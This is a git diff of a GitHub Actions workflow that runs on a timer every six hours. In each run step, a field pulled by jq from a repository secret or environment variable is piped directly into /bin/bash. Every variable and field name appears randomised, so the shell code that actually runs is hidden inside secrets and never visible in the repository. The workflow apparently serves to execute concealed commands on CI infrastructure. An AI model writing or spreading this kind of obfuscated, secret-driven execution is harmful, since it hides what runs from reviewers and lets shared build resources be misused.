@@ -2,7 +2,8 @@ name: juiceqinzq
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '43 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: juiceqinzq
         env:
-          uhnl3: ${{ secrets.uhnl3 }}
+          iax75599: ${{ secrets.iax75599 }}
         run: |
-          echo $uhnl3 | jq -r .pzft83108 | /bin/bash
-          echo $iozx22672 | jq -r .ju992 | /bin/bash
-          echo $pbwa439 | jq -r .txum9 | /bin/bash
-          echo $dcw82 | jq -r .hiv291 | /bin/bash
-          echo $y53500 | jq -r .k25285 | /bin/bash
-          echo $s26 | jq -r .dr286 | /bin/bash
-          echo $dyfi34 | jq -r .h1436 | /bin/bash
-          echo $a7651 | jq -r .ccyd7 | /bin/bash
-          echo $cv437 | jq -r .ycmzb5170 | /bin/bash
-          echo $qnokb9 | jq -r .gzt79 | /bin/bash
-          echo $ghjl1521 | jq -r .akic340 | /bin/bash
-          echo $hywke03 | jq -r .nj33318 | /bin/bash
-          echo $gg673 | jq -r .nj73982 | /bin/bash
-          echo $iq0087 | jq -r .afoy60405 | /bin/bash
+          echo $iax75599 | jq -r .qeh913 | /bin/bash
+          echo $k5 | jq -r .dicmk3080 | /bin/bash
+          echo $nnkl5 | jq -r .jeoex63 | /bin/bash
+          echo $snov33 | jq -r .bi80 | /bin/bash
+          echo $uzlid8037 | jq -r .nyox1 | /bin/bash
+          echo $gyyd3924 | jq -r .jq28885 | /bin/bash
+          echo $et87 | jq -r .jz63 | /bin/bash
 
